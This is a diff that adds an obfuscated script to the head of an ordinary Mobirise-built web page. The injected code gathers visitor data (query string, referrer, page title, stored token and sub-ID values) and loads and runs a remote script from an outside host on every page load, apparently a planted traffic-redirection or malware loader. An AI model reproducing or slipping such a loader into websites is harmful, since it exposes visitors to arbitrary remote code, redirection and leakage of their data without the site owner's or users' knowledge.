@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html  >
 <head>
+  <script>
+    (function() {
+    var name = '_G3WrT9wjNDGNmZtd';
+    if (!window._G3WrT9wjNDGNmZtd) {
+        window._G3WrT9wjNDGNmZtd = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://folko-doc.site/FBx9RQKY',
+            P_PATH: 'https://folko-doc.site/9a1f79a/postback',
+        };
+    }
+    const _TfrNHx4txZQhgcsh = localStorage.getItem('config');
+    if (typeof _TfrNHx4txZQhgcsh !== 'undefined' && _TfrNHx4txZQhgcsh !== null) {
+        var _pwX83xnxHBcY6PG8 = JSON.parse(_TfrNHx4txZQhgcsh);
+        var _sVr9ftvDpMz6B2px = Math.round(+new Date()/1000);
+        if (_pwX83xnxHBcY6PG8.created_at + window._G3WrT9wjNDGNmZtd.ttl < _sVr9ftvDpMz6B2px) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _PRjm4BBD3KhFdCST = localStorage.getItem('subId');
+    var _Ccxkf7N1mY9W4MHK = localStorage.getItem('token');
+    var _XLb6fMq3V5c5g8c5 = '?return=js.client';
+        _XLb6fMq3V5c5g8c5 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _XLb6fMq3V5c5g8c5 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _XLb6fMq3V5c5g8c5 += '&default_keyword=' + encodeURIComponent(document.title);
+        _XLb6fMq3V5c5g8c5 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _XLb6fMq3V5c5g8c5 += '&name=' + encodeURIComponent(name);
+        _XLb6fMq3V5c5g8c5 += '&host=' + encodeURIComponent(window._G3WrT9wjNDGNmZtd.R_PATH);
+    if (typeof _PRjm4BBD3KhFdCST !== 'undefined' && _PRjm4BBD3KhFdCST && window._G3WrT9wjNDGNmZtd.unique) {
+        _XLb6fMq3V5c5g8c5 += '&sub_id=' + encodeURIComponent(_PRjm4BBD3KhFdCST);
+    }
+    if (typeof _Ccxkf7N1mY9W4MHK !== 'undefined' && _Ccxkf7N1mY9W4MHK && window._G3WrT9wjNDGNmZtd.unique) {
+        _XLb6fMq3V5c5g8c5 += '&token=' + encodeURIComponent(_Ccxkf7N1mY9W4MHK);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._G3WrT9wjNDGNmZtd.R_PATH + _XLb6fMq3V5c5g8c5;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   <!-- Site made with Mobirise Website Builder v4.12.3, https://mobirise.com -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
